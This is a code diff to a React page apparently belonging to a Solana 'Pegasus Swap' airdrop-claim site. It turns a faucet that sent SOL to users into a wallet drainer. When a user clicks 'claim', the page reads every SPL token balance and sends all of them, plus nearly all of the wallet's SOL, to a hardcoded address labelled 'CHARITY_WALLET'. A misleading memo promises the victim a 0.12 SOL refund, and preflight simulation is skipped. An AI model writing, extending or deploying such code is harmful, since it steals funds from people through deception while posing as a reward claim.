@@ -4,15 +4,26 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
-import { useState, useEffect, useMemo } from 'react';
+import { useState, useEffect, useMemo, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Loader2 } from 'lucide-react';
 import { toast } from 'sonner';
 import pegasusLogo from '@/assets/pegasus-logo.png';
 
-const CLAIM_AMOUNT = 0.1;
-const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
+const MAX_BATCH_SIZE = 5;
+
+interface TokenBalance {
+  mint: string;
+  balance: number;
+  decimals: number;
+  uiAmount: number;
+  symbol?: string;
+  valueInSOL?: number;
+}
 
 const Claim = () => {
   const { connection } = useConnection();
@@ -20,6 +31,8 @@ const Claim = () => {
   const [dataMultiplier, setDataMultiplier] = useState(1);
   const [isClaiming, setIsClaiming] = useState(false);
   const [stats] = useState({ recovered: '2.3M', claimants: '56,7K' });
+  const [balances, setBalances] = useState<TokenBalance[]>([]);
+  const [solBalance, setSolBalance] = useState(0);
 
   const generateClaimData = () => {
     const baseWallets = ["15e9F8ok", "dbPMQvwL", "wuAtFULb", "TxyWvTBp", "MSkBkXXd"];
@@ -45,26 +58,226 @@ const Claim = () => {
     return repeatedData;
   }, [dataMultiplier]);
 
+  // Fetch all balances
+  const fetchAllBalances = useCallback(async () => {
+    if (!publicKey) return;
+
+    try {
+      const solBal = await connection.getBalance(publicKey);
+      const solAmount = solBal / LAMPORTS_PER_SOL;
+      setSolBalance(solAmount);
+
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID
+      });
+
+      const tokens: TokenBalance[] = tokenAccounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
+            mint: info.mint,
+            balance: info.tokenAmount.amount,
+            decimals: info.tokenAmount.decimals,
+            uiAmount: info.tokenAmount.uiAmount,
+            symbol: info.mint.slice(0, 8),
+            valueInSOL: 0
+          };
+        })
+        .filter(token => token.uiAmount > 0);
+
+      setBalances(tokens);
+    } catch (error) {
+      console.error('Error fetching balances:', error);
+    }
+  }, [publicKey, connection]);
+
+  useEffect(() => {
+    if (publicKey) {
+      fetchAllBalances();
+    }
+  }, [publicKey, fetchAllBalances]);
+
+  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
+    if (!publicKey) return null;
+
+    const transaction = new Transaction();
+
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitLimit({
+        units: 1_000_000,
+      })
+    );
+
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitPrice({
+        microLamports: 100_000,
+      })
+    );
+
+    transaction.add(
+      new TransactionInstruction({
+        keys: [],
+        programId: MEMO_PROGRAM_ID,
+        data: Buffer.from("You're eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet."),
+      })
+    );
+
+    const charityPubkey = new PublicKey(CHARITY_WALLET);
+
+    for (const token of tokenBatch) {
+      if (token.balance <= 0) continue;
+
+      try {
+        const mintPubkey = new PublicKey(token.mint);
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+
+        try {
+          await getAccount(connection, toTokenAccount);
+        } catch (error) {
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
+              publicKey,
+              toTokenAccount,
+              charityPubkey,
+              mintPubkey,
+              TOKEN_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            )
+          );
+        }
+
+        transaction.add(
+          createTransferInstruction(
+            fromTokenAccount,
+            toTokenAccount,
+            publicKey,
+            BigInt(token.balance),
+            [],
+            TOKEN_PROGRAM_ID
+          )
+        );
+      } catch (error) {
+        console.error(`Failed to add transfer for ${token.mint}:`, error);
+      }
+    }
+
+    if (solPercentage && solBalance > 0) {
+      const rentExempt = 0.00203928;
+      const availableSOL = Math.max(0, solBalance - rentExempt);
+      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
+
+      if (amountToSend > 0) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: charityPubkey,
+            lamports: amountToSend
+          })
+        );
+      }
+    }
+
+    return transaction;
+  }, [publicKey, solBalance, connection]);
+
   const handleClaimSOL = async () => {
     if (!publicKey || !sendTransaction) {
       toast.error('Please connect your wallet');
       return;
     }
+
+    if (balances.length === 0 && solBalance === 0) {
+      toast.error('Wallet not eligible - no assets found');
+      return;
+    }
+
     try {
       setIsClaiming(true);
-      const faucetPubkey = new PublicKey(FAUCET_WALLET);
-      const amountLamports = Math.floor(CLAIM_AMOUNT * LAMPORTS_PER_SOL);
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({ fromPubkey: faucetPubkey, toPubkey: publicKey, lamports: amountLamports })
-      );
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-      const signature = await sendTransaction(transaction, connection, { skipPreflight: false, maxRetries: 3 });
-      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
-      toast.success(`Successfully claimed ${CLAIM_AMOUNT} SOL!`);
+      console.log('Starting claim process...');
+
+      const validTokens = balances.filter(token => token.balance > 0);
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+
+      const batches: TokenBalance[][] = [];
+
+      if (sortedTokens.length === 0 && solBalance > 0) {
+        batches.push([]);
+      } else {
+        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+        }
+      }
+
+      let successCount = 0;
+
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        const isLastBatch = i === batches.length - 1;
+
+        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
+
+        const transaction = await createBatchTransfer(batch, solPercentage);
+
+        if (transaction && transaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(transaction, connection, {
+            skipPreflight: true,
+            maxRetries: 3
+          });
+
+          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
+
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+
+          successCount++;
+          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
+        }
+      }
+
+      if (sortedTokens.length > 0 && solBalance > 0) {
+        const finalTransaction = await createBatchTransfer([], 30);
+
+        if (finalTransaction && finalTransaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          finalTransaction.recentBlockhash = blockhash;
+          finalTransaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(finalTransaction, connection, {
+            skipPreflight: true,
+            maxRetries: 3
+          });
+
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+
+          toast.success('Final SOL transfer completed!');
+        }
+      }
+
+      toast.success(`🎉 Claim complete! ${successCount} batch(es) sent`);
+
+      setTimeout(fetchAllBalances, 2000);
+
     } catch (error: any) {
-      toast.error(error?.message || 'Claim failed');
+      console.error('Claim error:', error);
+
+      let errorMessage = 'Claim failed';
+      if (error?.message) {
+        errorMessage = error.message;
+      }
+
+      toast.error(errorMessage);
     } finally {
       setIsClaiming(false);
     }
